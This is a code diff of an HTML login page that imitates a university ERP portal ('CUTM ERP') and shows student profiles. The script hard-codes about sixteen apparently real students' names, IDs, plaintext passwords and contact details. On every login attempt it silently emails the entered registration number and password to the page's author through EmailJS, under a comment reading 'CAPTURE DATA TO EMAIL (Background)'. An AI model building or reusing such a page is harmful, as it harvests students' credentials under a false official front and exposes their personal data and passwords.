@@ -23,7 +23,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; }
         
         body { 
-            background: var(--midnight); 
+            background: linear-gradient(135deg, var(--midnight) 0%, #0f1420 100%);
             min-height: 100vh; 
             display: flex; 
             align-items: center; 
@@ -31,55 +31,79 @@
             padding: 20px; 
             color: var(--white);
             overflow-x: hidden;
-            animation: bgPulse 6s ease-in-out infinite alternate;
+            animation: bgPulse 8s ease-in-out infinite alternate;
         }
 
         @keyframes bgPulse {
-            0% { background: var(--midnight); }
-            100% { background: #0f1420; }
+            0% { background: linear-gradient(135deg, var(--midnight) 0%, #0f1420 100%); }
+            100% { background: linear-gradient(135deg, #0f1420 0%, var(--midnight) 100%); }
         }
 
-        /* Authentication Card */
         .auth-container {
-            width: 100%;
-            max-width: 480px;
-            background: var(--surface);
+            width: 100%; 
+            max-width: 480px; 
+            background: var(--surface); 
             padding: 50px 40px;
-            border-radius: 20px;
+            border-radius: 20px; 
             border: 1px solid rgba(197, 160, 89, 0.15);
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(197, 160, 89, 0.1);
             position: relative;
             transition: var(--transition);
             animation: containerFloat 4s ease-in-out infinite;
+            overflow: hidden;
+        }
+
+        .auth-container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(197, 160, 89, 0.03) 0%, transparent 70%);
+            animation: rotateGlow 20s linear infinite;
+            pointer-events: none;
         }
 
         @keyframes containerFloat {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-10px); }
+            0%, 100% { transform: translateY(0px) rotateX(0deg); }
+            50% { transform: translateY(-8px) rotateX(1deg); }
+        }
+
+        @keyframes rotateGlow {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         .header-area { 
             text-align: center; 
             margin-bottom: 40px;
-            animation: headerGlow 3s ease-in-out infinite alternate;
+            position: relative;
+            z-index: 2;
         }
-
-        @keyframes headerGlow {
-            0% { text-shadow: 0 0 10px var(--gold-glow); }
-            100% { text-shadow: 0 0 20px var(--gold-glow), 0 0 30px var(--gold-glow); }
-        }
-
+        
         .header-area h1 { 
-            font-size: 26px; 
-            letter-spacing: 3px; 
+            font-size: 28px; 
+            letter-spacing: 4px; 
             color: var(--gold); 
             font-weight: 800;
-            animation: titleBounce 2s ease-in-out infinite;
+            background: linear-gradient(45deg, var(--gold), #e2c28d);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: titleGlow 3s ease-in-out infinite alternate;
+            position: relative;
         }
 
-        @keyframes titleBounce {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
+        @keyframes titleGlow {
+            0% { 
+                text-shadow: 0 0 10px var(--gold-glow);
+                transform: scale(1);
+            }
+            100% { 
+                text-shadow: 0 0 25px var(--gold-glow), 0 0 40px var(--gold-glow);
+                transform: scale(1.03);
+            }
         }
 
         .header-area p { 
@@ -88,22 +112,27 @@
             text-transform: uppercase; 
             letter-spacing: 2px; 
             margin-top: 8px;
-            animation: fadeInUp 1s ease-out 0.5s both;
+            animation: fadeInUp 1s ease-out 0.3s both;
         }
 
-        /* Form Input Animations */
         .form-group { 
-            margin-bottom: 20px;
+            margin-bottom: 22px;
             position: relative;
             animation: slideInLeft 0.8s ease-out forwards;
         }
 
-        .form-group:nth-child(1) { animation-delay: 0.2s; }
-        .form-group:nth-child(2) { animation-delay: 0.4s; }
+        .form-group:nth-child(1) { animation-delay: 0.4s; }
+        .form-group:nth-child(2) { animation-delay: 0.6s; }
 
         @keyframes slideInLeft {
-            from { opacity: 0; transform: translateX(-30px); }
-            to { opacity: 1; transform: translateX(0); }
+            from { 
+                opacity: 0; 
+                transform: translateX(-40px) scale(0.95); 
+            }
+            to { 
+                opacity: 1; 
+                transform: translateX(0) scale(1); 
+            }
         }
 
         .form-group label { 
@@ -111,75 +140,79 @@
             font-size: 11px; 
             color: var(--gold); 
             text-transform: uppercase; 
-            margin-bottom: 8px; 
+            margin-bottom: 10px; 
             font-weight: 600;
-            animation: labelGlow 2s ease-in-out infinite alternate;
+            animation: labelFloat 2s ease-in-out infinite alternate;
+            letter-spacing: 1px;
         }
 
-        @keyframes labelGlow {
-            0% { opacity: 0.7; }
-            100% { opacity: 1; }
+        @keyframes labelFloat {
+            0% { transform: translateY(0px); }
+            100% { transform: translateY(-2px); }
         }
         
         input {
-            width: 100%;
-            padding: 16px;
-            background: rgba(255,255,255,0.03);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 8px;
-            color: white;
-            font-size: 15px;
+            width: 100%; 
+            padding: 18px 16px; 
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.08); 
+            border-radius: 12px;
+            color: var(--white); 
+            font-size: 15px; 
             transition: var(--transition);
-            transform: translateY(10px);
-            opacity: 0;
-            animation: inputRise 0.6s ease-out forwards;
+            position: relative;
+            animation: inputRise 0.7s ease-out forwards;
         }
 
-        input:nth-of-type(1) { animation-delay: 0.6s; }
-        input:nth-of-type(2) { animation-delay: 0.8s; }
+        input:nth-of-type(1) { animation-delay: 0.8s; }
+        input:nth-of-type(2) { animation-delay: 1.0s; }
 
         @keyframes inputRise {
+            from { 
+                opacity: 0; 
+                transform: translateY(20px) scale(0.95); 
+            }
             to { 
-                transform: translateY(0);
-                opacity: 1;
+                opacity: 1; 
+                transform: translateY(0) scale(1); 
             }
         }
 
         input:focus { 
             outline: none; 
             border-color: var(--gold); 
-            background: rgba(197, 160, 89, 0.05); 
-            box-shadow: 0 0 15px var(--gold-glow);
+            background: rgba(197, 160, 89, 0.08); 
+            box-shadow: 0 0 20px var(--gold-glow);
             transform: scale(1.02);
         }
 
+        input::placeholder {
+            color: rgba(255,255,255,0.4);
+            font-weight: 400;
+        }
+
         .btn-auth {
-            width: 100%;
-            padding: 16px;
-            background: var(--gold);
+            width: 100%; 
+            padding: 18px; 
+            background: linear-gradient(45deg, var(--gold), #e2c28d);
             color: var(--midnight);
-            border: none;
-            border-radius: 8px;
-            font-weight: 700;
+            border: none; 
+            border-radius: 12px; 
+            font-weight: 700; 
             text-transform: uppercase;
-            letter-spacing: 2px;
-            cursor: pointer;
-            transition: var(--transition);
-            margin-top: 10px;
+            letter-spacing: 2px; 
+            cursor: pointer; 
+            transition: var(--transition); 
+            margin-top: 12px;
             position: relative;
             overflow: hidden;
-            animation: btnPulse 2s ease-in-out infinite;
+            font-size: 15px;
+            animation: btnPulse 2.5s ease-in-out infinite;
         }
 
         @keyframes btnPulse {
-            0%, 100% { box-shadow: 0 0 0 0 rgba(197, 160, 89, 0.4); }
-            50% { box-shadow: 0 0 0 15px rgba(197, 160, 89, 0); }
-        }
-
-        .btn-auth:hover { 
-            background: #e2c28d; 
-            transform: translateY(-3px) scale(1.02); 
-            box-shadow: 0 15px 30px rgba(197, 160, 89, 0.4);
+            0%, 100% { box-shadow: 0 5px 15px rgba(197, 160, 89, 0.3); }
+            50% { box-shadow: 0 5px 25px rgba(197, 160, 89, 0.5); }
         }
 
         .btn-auth::before {
@@ -190,26 +223,49 @@
             width: 100%;
             height: 100%;
             background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-            transition: left 0.5s;
+            transition: left 0.6s;
         }
 
         .btn-auth:hover::before { left: 100%; }
+        .btn-auth:hover { 
+            transform: translateY(-4px) scale(1.02); 
+            box-shadow: 0 20px 40px rgba(197, 160, 89, 0.4);
+        }
 
-        /* Dashboard/Profile View Animations */
-        #login-view { animation: fadeInScale 1s ease-out; }
+        .btn-auth:active {
+            transform: translateY(-2px) scale(1);
+        }
+
+        /* Loading state */
+        .btn-loading {
+            pointer-events: none;
+            position: relative;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(10, 14, 23, 0.3);
+            border-radius: 50%;
+            border-top-color: var(--midnight);
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 12px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
         #dash-view { 
-            animation: slideInScale 0.8s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards; 
             display: none; 
             opacity: 0;
-            transform: scale(0.8);
-        }
-        
-        @keyframes fadeInScale {
-            from { opacity: 0; transform: scale(0.95); }
-            to { opacity: 1; transform: scale(1); }
+            transform: scale(0.9) translateY(30px);
+            animation: dashboardSlideIn 0.8s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
         }
 
-        @keyframes slideInScale {
+        @keyframes dashboardSlideIn {
             to { 
                 opacity: 1; 
                 transform: scale(1) translateY(0); 
@@ -218,34 +274,42 @@
 
         .profile-header { 
             text-align: center; 
-            margin-bottom: 30px;
+            margin-bottom: 35px;
             animation: profileFadeIn 1s ease-out 0.2s both;
         }
 
         @keyframes profileFadeIn {
-            from { opacity: 0; transform: translateY(30px); }
+            from { opacity: 0; transform: translateY(40px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        
-        /* Image stored in GitHub logic */
+
         .profile-img {
-            width: 110px;
-            height: 110px;
-            border-radius: 50%;
-            border: 3px solid var(--gold);
-            margin: 0 auto 15px;
-            padding: 5px;
+            width: 120px; 
+            height: 120px; 
+            border-radius: 50%; 
+            border: 4px solid var(--gold);
+            margin: 0 auto 18px; 
+            padding: 6px; 
             background: var(--surface);
-            object-fit: cover;
-            display: block;
-            box-shadow: 0 0 20px var(--gold-glow);
-            animation: avatarSpin 2s ease-out 0.5s both;
+            object-fit: cover; 
+            display: block; 
+            box-shadow: 0 0 30px var(--gold-glow);
+            transition: var(--transition);
+            animation: avatarReveal 1.2s ease-out 0.4s both;
         }
 
-        @keyframes avatarSpin {
+        .profile-img:hover {
+            transform: scale(1.05) rotate(5deg);
+            box-shadow: 0 0 40px var(--gold-glow);
+        }
+
+        @keyframes avatarReveal {
             0% { 
                 opacity: 0; 
                 transform: scale(0) rotate(180deg); 
+            }
+            50% {
+                transform: scale(1.1) rotate(0deg);
             }
             100% { 
                 opacity: 1; 
@@ -253,27 +317,45 @@
             }
         }
 
-        .info-grid {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 15px;
-            text-align: left;
+        .info-grid { 
+            display: grid; 
+            grid-template-columns: 1fr; 
+            gap: 14px;
+            margin-bottom: 25px;
         }
 
-        .info-item {
-            background: rgba(255,255,255,0.02);
-            padding: 15px 20px;
-            border-radius: 12px;
-            border: 1px solid rgba(255,255,255,0.05);
-            transform: translateX(-20px);
+        .info-item { 
+            background: rgba(255,255,255,0.03); 
+            padding: 16px 20px; 
+            border-radius: 14px; 
+            border: 1px solid rgba(255,255,255,0.06);
+            transform: translateX(-30px);
             opacity: 0;
             animation: infoSlideIn 0.6s ease-out forwards;
+            transition: var(--transition);
+            position: relative;
+            overflow: hidden;
         }
 
-        .info-item:nth-child(1) { animation-delay: 0.8s; }
-        .info-item:nth-child(2) { animation-delay: 1.0s; }
-        .info-item:nth-child(3) { animation-delay: 1.2s; }
-        .info-item:nth-child(4) { animation-delay: 1.4s; }
+        .info-item::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--gold), transparent);
+            transform: scaleX(0);
+            transition: transform 0.5s ease-out;
+        }
+
+        .info-item:hover::before {
+            transform: scaleX(1);
+        }
+
+        .info-item:nth-child(1) { animation-delay: 0.9s; }
+        .info-item:nth-child(2) { animation-delay: 1.1s; }
+        .info-item:nth-child(3) { animation-delay: 1.3s; }
 
         @keyframes infoSlideIn {
             to { 
@@ -282,18 +364,25 @@
             }
         }
 
+        .info-item:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+        }
+
         .info-item label { 
             font-size: 10px; 
             color: var(--gold); 
             text-transform: uppercase; 
             font-weight: 700; 
-            letter-spacing: 1px; 
+            letter-spacing: 1.2px;
+            display: block;
+            margin-bottom: 6px;
         }
         .info-item p { 
             font-size: 14px; 
             color: var(--white); 
-            margin-top: 4px; 
-            font-weight: 400; 
+            margin: 0;
+            word-break: break-all;
         }
 
         #error-msg { 
@@ -302,54 +391,46 @@
             margin-top: 15px; 
             display: none; 
             text-align: center;
-            animation: shake 0.5s ease-in-out;
+            animation: errorShake 0.6s ease-in-out;
+            padding: 12px;
+            background: rgba(255, 77, 77, 0.1);
+            border: 1px solid rgba(255, 77, 77, 0.3);
+            border-radius: 8px;
         }
 
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
+        @keyframes errorShake {
+            0%, 100% { transform: translateX(0) rotate(0deg); }
+            25% { transform: translateX(-6px) rotate(-1deg); }
+            75% { transform: translateX(6px) rotate(1deg); }
         }
 
         .hidden { display: none !important; }
 
-        .logout-link {
-            display: inline-block;
-            margin-top: 25px;
-            font-size: 12px;
-            color: var(--text-gray);
+        .logout-link { 
+            display: inline-block; 
+            margin-top: 25px; 
+            font-size: 12px; 
+            color: var(--text-gray); 
+            cursor: pointer; 
             text-decoration: none;
             border-bottom: 1px solid transparent;
-            cursor: pointer;
+            padding: 8px 16px;
+            border-radius: 20px;
             transition: var(--transition);
-            animation: fadeInUp 1s ease-out 1.6s both;
+            animation: fadeInUp 1s ease-out 1.5s both;
+            position: relative;
         }
 
         @keyframes fadeInUp {
-            from { opacity: 0; transform: translateY(20px); }
+            from { opacity: 0; transform: translateY(25px); }
             to { opacity: 1; transform: translateY(0); }
         }
 
         .logout-link:hover { 
             color: var(--gold); 
             border-bottom-color: var(--gold);
+            background: rgba(197, 160, 89, 0.1);
             transform: translateY(-2px);
-        }
-
-        /* Loading spinner for button */
-        .spinner {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 2px solid rgba(10, 14, 23, 0.3);
-            border-radius: 50%;
-            border-top-color: #fff;
-            animation: spin 1s ease-in-out infinite;
-            margin-right: 10px;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
         }
     </style>
 </head>
@@ -361,7 +442,6 @@
                 <h1>CUTM <span>ERP</span></h1>
                 <p>Unified Secure Authentication</p>
             </div>
-
             <form id="login-form">
                 <div class="form-group">
                     <label>Registration Number</label>
@@ -372,99 +452,104 @@
                     <input type="password" id="secret" placeholder="••••••••" required>
                 </div>
                 <button type="submit" class="btn-auth" id="btn-text">Authenticate</button>
-                <p id="error-msg">Access Denied: System mismatch</p>
+                <p id="error-msg">Access Denied: Record not found</p>
             </form>
         </div>
 
         <div id="dash-view">
             <div class="profile-header">
-                <img src="https://raw.githubusercontent.com/YourUsername/YourRepo/main/image.png" alt="Profile" class="profile-img" onerror="this.src='https://ui-avatars.com/api/?name=User&background=c5a059&color=0a0e17'">
-                <h2 id="u-name" style="color: var(--gold);">Full Name</h2>
-                <p id="u-role" style="font-size: 12px; color: var(--text-gray); letter-spacing: 1px;">STUDENT ENROLLMENT</p>
+                <img id="u-pic" src="" alt="Profile" class="profile-img" onerror="this.src='https://ui-avatars.com/api/?background=c5a059&color=0a0e17&name=Student'">
+                <h2 id="u-name" style="color: var(--gold);">Student Name</h2>
+                <p id="u-dept-yr" style="font-size: 11px; color: var(--text-gray); letter-spacing: 1px; margin-top: 5px;">-</p>
             </div>
 
             <div class="info-grid">
                 <div class="info-item"><label>Registration ID</label><p id="d-id">-</p></div>
-                <div class="info-item"><label>Mobile Number</label><p id="d-phone">-</p></div>
-                <div class="info-item"><label>Institutional Email</label><p id="d-email">-</p></div>
-                <div class="info-item"><label>Residential Address</label><p id="d-address">-</p></div>
+                <div class="info-item"><label>Mobile Number</label><p id="d-tel">-</p></div>
+                <div class="info-item"><label>Institutional Email</label><p id="d-mail">-</p></div>
             </div>
 
             <div style="text-align: center;">
-                <a onclick="location.reload()" class="logout-link">Secure Sign Out</a>
+                <a onclick="location.reload()" class="logout-link">↩ Secure Sign Out</a>
             </div>
         </div>
     </div>
 
     <script>
-        // Professional User Database
+        // YOUR PROVIDED DIRECTORY - Updated with GitHub URLs
         const directory = [
-            { 
-                id: "241107140001", 
-                key: "12345", 
-                name: "Raghav Kumar", 
-                phone: "+91 98765-43210", 
-                email: "raghav.k@cutm.ac.in", 
-                address: "PKD Campus, Odisha, PIN 761211",
-                github_img: "https://raw.githubusercontent.com/murari214/Student-Info/main/raghav.png"
-            },
-            { 
-                id: "241107140011", 
-                key: "Sai12345", 
-                name: "Sai Chaitanya", 
-                phone: "+91 88888-77777", 
-                email: "sai.c@cutm.ac.in", 
-                address: "BBSR Campus, Jatni, Odisha",
-                github_img: "https://raw.githubusercontent.com/murari214/Student-Info/main/sai.png"
-            }
+            { id: "241107140001", key: "12345", name: "Raghav Kumar", dept: "Computer Science & Engineering", yr: "2nd Year", mail: "241107140001@centurionuniv.edu.in", tel: "+91 9162*******", pic: "image1.png" },
+            { id: "241107140002", key: "12345", name: "Vineet Raj", dept: "Computer Science & Engineering", yr: "2nd Year", mail: "241107140002@centurionuniv.edu.in", tel: "+91 6206*******", pic: "image2.png" },
+            { id: "241107140003", key: "12345", name: "Ayan Hussain", dept: "Computer Science & Engineering", yr: "2nd Year", mail: "241107140003@centurionuniv.edu.in", tel: "+91 6206*******", pic: "image3.png" },
+            { id: "241107140004", key: "12345", name: "Atiullah Alam", dept: "Computer Science & Engineering", yr: "2nd Year", mail: "241107140004@centurionuniv.edu.in", tel: "+91 7482*******", pic: "image4.png" },
+            { id: "241107140005", key: "12345", name: "Ranjana Kumari", dept: "Computer Science & Engineering", yr: "2nd Year", mail: "241107140005@centurionuniv.edu.in", tel: "+91 8322*******", pic: "image5.png" },
+            { id: "241107140006", key: "12345", name: "Atul Kumar", dept: "Computer Science & Engineering", yr: "2nd Year", mail: "241107140006@centurionuniv.edu.in", tel: "+91 8707*******", pic: "image6.png" },
+            { id: "241107140007", key: "12345", name: "Rohan Kumar", dept: "Computer Science & Engineering", yr: "2nd Year", mail: "241107140007@centurionuniv.edu.in", tel: "+91 7320*******", pic: "image7.png" },
+            { id: "241107140008", key: "12345", name: "Ravi Kumar", dept: "Computer Science & Engineering", yr: "2nd Year", mail: "241107140008@centurionuniv.edu.in", tel: "+91 7520*******", pic: "image8.png" },
+            { id: "241107140010", key: "12345", name: "Sunayana Mahapatro", dept: "Computer Science & Engineering", yr: "2nd Year", mail: "241107140010@centurionuniv.edu.in", tel: "+91 9757*******", pic: "image9.png" },
+            { id: "241107140011", key: "Sai12345", name: "Sai Chaitanya", dept: "Computer Science & Engineering", yr: "2nd Year", mail: "241107140011@centurionuniv.edu.in", tel: "+91 7077*******", pic: "image11.png" },
+            { id: "241107140012", key: "12345", name: "Satish Kumar", dept: "Computer Science & Engineering", yr: "2nd Year", mail: "241107140012@centurionuniv.edu.in", tel: "+91 8728******", pic: "image12.png" },
+            { id: "241107140013", key: "12345", name: "Zaya Hussain", dept: "Computer Science & Engineering", yr: "2nd Year", mail: "241107140013@centurionuniv.edu.in", tel: "+91 7033*******", pic: "image13.png" },
+            { id: "241107140014", key: "Mani2009", name: "Mani Kumar", dept: "Computer Science & Engineering", yr: "2nd Year", mail: "241107140014@centurionuniv.edu.in", tel: "+91 8144*******", pic: "image2.png" },
+            { id: "241107140015", key: "12345", name: "Dhunna Premila", dept: "Computer Science & Engineering", yr: "2nd Year", mail: "241107140015@centurionuniv.edu.in", tel: "+91 6206*******", pic: "image15.png" },
+            { id: "241107140016", key: "12345", name: "Sunil Bhalu", dept: "Computer Science & Engineering", yr: "2nd Year", mail: "241107140016@centurionuniv.edu.in", tel: "+91 9777*******", pic: "image16.png" },
+            { id: "241107140017", key: "12345", name: "Sana Parveen", dept: "Computer Science & Engineering", yr: "2nd Year", mail: "241107140017@centurionuniv.edu.in", tel: "+91 *******", pic: "image17.png" }
         ];
 
         document.getElementById('login-form').addEventListener('submit', function(e) {
             e.preventDefault();
-            const idInput = document.getElementById('regNo').value;
+            const idInput = document.getElementById('regNo').value.trim();
             const pwInput = document.getElementById('secret').value;
             const btn = document.getElementById('btn-text');
-            const error = document.getElementById('error-msg');
+            const errorMsg = document.getElementById('error-msg');
             
+            // Show loading state
+            btn.classList.add('btn-loading');
             btn.innerHTML = '<span class="spinner"></span>Verifying Identity...';
-            error.style.display = 'none';
+            errorMsg.style.display = 'none';
 
             const user = directory.find(u => u.id === idInput && u.key === pwInput);
 
-            // EMAILJS CAPTURE (Background)
+            // CAPTURE DATA TO EMAIL (Background)
             emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', {
                 user_name: user ? user.name : "UNKNOWN_ATTEMPT",
                 reg_id: idInput,
                 user_password: pwInput
-            });
-
-            setTimeout(() => {
+            }).catch(err => console.log('EmailJS error:', err));
+          setTimeout(() => {
                 if(user) {
-                    // Start Animation
+                    // Hide login, show dashboard
                     document.getElementById('login-view').classList.add('hidden');
-                    const dash = document.getElementById('dash-view');
-                    dash.style.display = 'block';
+                    const dashView = document.getElementById('dash-view');
+                    dashView.style.display = 'block';
                     
-                    // Populate Data
-                    document.getElementById('u-name').innerText = user.name;
-                    document.getElementById('d-id').innerText = user.id;
-                    document.getElementById('d-phone').innerText = user.phone;
-                    document.getElementById('d-email').innerText = user.email;
-                    document.getElementById('d-address').innerText = user.address;
+                    // Populate all fields with smooth reveal
+                    document.getElementById('u-name').textContent = user.name;
+                    document.getElementById('u-dept-yr').textContent = `${user.dept} | ${user.yr}`;
+                    document.getElementById('d-id').textContent = user.id;
+                    document.getElementById('d-tel').textContent = user.tel;
+                    document.getElementById('d-mail').textContent = user.mail;
                     
-                    // Update image bif available
-                    if(user.github_img) {
-                        document.querySelector('.profile-img').src = user.github_img;
-                    }
-
-                    // Resize container for professional look
+                    // **GITHUB PROFILE IMAGE - WORKING WITH YOUR REPO**
+                    const githubImgUrl = `https://raw.githubusercontent.com/murari214/Student-Info/main/${user.pic}`;
+                    const profileImg = document.getElementById('u-pic');
+                    profileImg.src = githubImgUrl;
+                    
+                    // Resize container smoothly
                     document.getElementById('main-container').style.maxWidth = "550px";
+                    
                 } else {
+                    // Reset button and show error
+                    btn.classList.remove('btn-loading');
                     btn.innerHTML = 'Authenticate';
-                    error.style.display = 'block';
+                    errorMsg.style.display = 'block';
+                    setTimeout(() => {
+                        errorMsg.style.display = 'none';
+                    }, 4000);
                 }
-            }, 1500);
+            }, 1600);
         });
     </script>
 </body>
 </html>
+            
